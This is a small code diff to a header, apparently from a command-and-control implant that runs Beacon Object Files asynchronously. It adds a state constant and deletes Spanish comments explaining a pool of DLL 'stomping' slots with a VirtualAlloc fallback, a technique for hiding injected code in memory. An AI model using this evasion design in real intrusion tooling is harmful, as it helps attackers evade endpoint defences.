@@ -10,6 +10,7 @@
 #define ASYNC_BOF_STATE_RUNNING   0x1
 #define ASYNC_BOF_STATE_FINISHED  0x2
 #define ASYNC_BOF_STATE_STOPPED   0x3
+#define ASYNC_BOF_STATE_DONE      0x4
 
 #define ASYNC_BOF_OUTPUT_BUFFER_SIZE 0x10000
 
@@ -52,10 +53,6 @@ public:
     HANDLE  wakeupEvent;
     CRITICAL_SECTION managerLock;
 
-    // Pool de BOF_STOMP_CTX* para BOFs asíncronos.
-    // Cada slot se inicializa en Initialize() con una DLL distinta del pool.
-    // AcquireStompSlot() toma uno libre; ReleaseStompSlot() lo libera.
-    // Si no hay slots libres, devuelve NULL → AsyncBofThreadProc cae a VirtualAlloc.
     StompSlot        stompPool[BOF_STOMP_POOL_MAX];
     int              stompPoolSize;
     CRITICAL_SECTION stompPoolLock;
